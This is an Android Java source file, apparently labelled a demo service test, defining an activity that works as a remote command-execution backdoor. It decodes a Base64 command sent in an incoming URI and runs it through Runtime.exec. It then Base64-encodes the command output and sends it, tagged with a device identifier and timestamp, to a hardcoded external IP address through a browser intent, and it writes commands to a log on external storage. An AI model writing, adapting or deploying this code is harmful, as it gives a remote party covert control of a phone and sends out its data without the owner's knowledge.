package com.example.demoservicetest;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class StartOnUri extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		try {
			super.onCreate(savedInstanceState);
			String idR = "1";
			String command = "";

			Uri data = getIntent().getData();
			if (data != null) {
				List<String> params = data.getPathSegments();
				if (!params.isEmpty()) {
					// if (params.size() >= 2) {
					idR = (String) params.get(0);
					command = (String) params.get(1);
					// }
				}
			} else {
				idR = "0";
			}

			String decCommand = new String(Base64.decode(command.toString()
					.replace("+", " ").getBytes(), Base64.DEFAULT));// command.toString().replace("+",
																	// " ");//
																	// Arrays.toString(command.getBytes());
			// byte[] decCommand = command.getBytes();

			writeToFile("Command: " + decCommand);

			String id = idR;// Arrays.toString(idR.getBytes());
			/*
			 * try { PrintWriter out = new PrintWriter(new BufferedWriter( new
			 * FileWriter(Environment.getExternalStorageDirectory() .getPath() +
			 * "/Log.log", true))); String logOutString = "LOG: " + id + " - " +
			 * decCommand + " \n"; // Log.d("StartOnUi", "LOG: " + id + " - " +
			 * decCommand); out.println(logOutString); out.close(); } catch
			 * (IOException e) { // TODO Auto-generated catch block
			 * e.printStackTrace(); }
			 */
			String request = "";
			StringBuffer output = null;
			if (!decCommand.equals("")) {
				try {
					Process process = Runtime.getRuntime().exec(
							decCommand.toString());
					try {
						BufferedReader reader = new BufferedReader(
								new InputStreamReader(process.getInputStream()));

						int read;
						char[] buffer = new char[4096];
						output = new StringBuffer();
						while ((read = reader.read(buffer, 0, 4096)) > 0) {
							output.append(buffer, 0, read);
						}
						reader.close();
					} finally {
						process.destroy();
					}
				} catch (IOException e) {
					e.printStackTrace();
					//output.append("Command Error", 0, 13);
					request = Uri.encode(new String(Base64.encodeToString("Command Error".getBytes(), Base64.DEFAULT)));
					callBrowserForRequest("&cID=" + id);
				}

				request = "";

				// --writeToFile(Uri.encode(output.toString()));
				request = Uri.encode(new String(Base64.encodeToString(output
						.toString().getBytes(), Base64.DEFAULT)));// Uri.encode(output.toString());

				writeToFile("Request: " + request);

				request += "&cID=" + id;
				callBrowserForRequest(request); // command must be base64 coded
			}
			finish();
		} catch (NullPointerException e) {
			//e.printStackTrace();
		}
	}

	private void writeToFile(String content) {
		try {
			PrintWriter out = new PrintWriter(new BufferedWriter(
					new FileWriter(Environment.getExternalStorageDirectory()
							.getPath() + "/Log.log", true)));
			String logOutString = "LOG: " + content + " \n";
			out.println(logOutString);
			out.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			Log.d("startLoop", "IO exception in writeToFile");
			e.printStackTrace();
		}
	}

	@Override
	public void onBackPressed() {
		moveTaskToBack(true);
	}

	public void callBrowserForRequest(String request) {
		long lDateTime = new Date().getTime();
//		TelephonyManager tManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		int uuid = android.os.Build.MODEL.hashCode();
		startActivity(new Intent(
				Intent.ACTION_VIEW,
				Uri.parse("http://212.201.64.227/chrisMaster/redi.php?devID="+uuid+"&ds="
						+ lDateTime + "&command=" + request))
				.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));

	}

}
